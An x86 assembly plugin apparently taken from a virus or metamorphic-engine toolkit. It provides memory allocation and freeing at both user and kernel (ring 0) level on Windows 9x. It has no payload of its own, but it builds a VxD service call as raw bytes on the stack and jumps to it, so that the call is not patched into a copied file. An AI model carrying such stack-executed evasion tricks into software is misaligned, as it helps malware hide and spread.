   ; MEMORY
   ; ~~~~~~
   ; - unversal R0/R3 malloc/mfree functions

   include                 INCLUDE\consts.inc
   include                 k32man.inc

   include                 plugin.inc
                           PLUGIN_START    MEMORY, CODE32, PERMUTABLE

   handleevent:            hookevent EV_MEMORY_MALLOC, malloc
                           hookevent EV_MEMORY_MFREE, mfree
                           stc
                           retn

   ; input:  ECX=size
   ; output: ZF=0  EDX=pointer to allocated memory
   ;         ZF=1  EDX=0  error

   malloc:                 pusha                   ; allocate memory

                           IS_RING0        ; EAX changed
                           jz      __ring0

   __ring3:                push    ecx
                           push    0
                           callX   GlobalAlloc

                           jmp     __exit

   __ring0:                add     ecx, 4095
                           shr     ecx, 12          ; EDI = # of pages

   ; VMM.PageAllocate is called from a PE file, changed to FF 15,
   ; and (if memory page is readonly) it will be written into disk-cache,
   ; and then, if file will be copied...

   ;;                      VMMcall PageAllocate

                           pusho   __return
                           pop     edi
                           push    0E7FF0001h
                           push    0005320CDh
                           mov     esi, esp

                           push    PAGEFIXED + PAGEZEROINIT
                           xor     eax, eax
                           push    eax     ; PhysAddr
                           push    eax     ; maxPhys
                           push    eax     ; minPhys
                           push    eax     ; Align
                           push    eax     ; handle of VM (==0 if PG_SYS)
                           push    PG_SYS  ; flags
                           push    ecx     ; nPages
                           jmp     esi

   __return:               add     esp, 4+4+8*4

   __exit:                 mov     [esp].popa_edx, eax          ; popa.edx
                           or      eax, eax

                           jz      __quit
                           mov     edi, eax
                           mov     ecx, [esp].pusha_ecx
                           xor     eax, eax
                           cld
                           rep     stosb
                           or      esp, esp        ; NZ
   __quit:
                           popa
                           clc
                           retn

   ; input: EDX=allocated memory block

   mfree:                  pusha

                           IS_RING0        ; EAX changed
                           jz      __ring0

   __ring3:                push    edx
                           callX   GlobalFree

                           popa
                           clc
                           retn

   __ring0:                push    0
                           push    edx
                           VMMcall PageFree
                           add     esp, 8

                           popa
                           clc
                           retn

                           PLUGIN_END
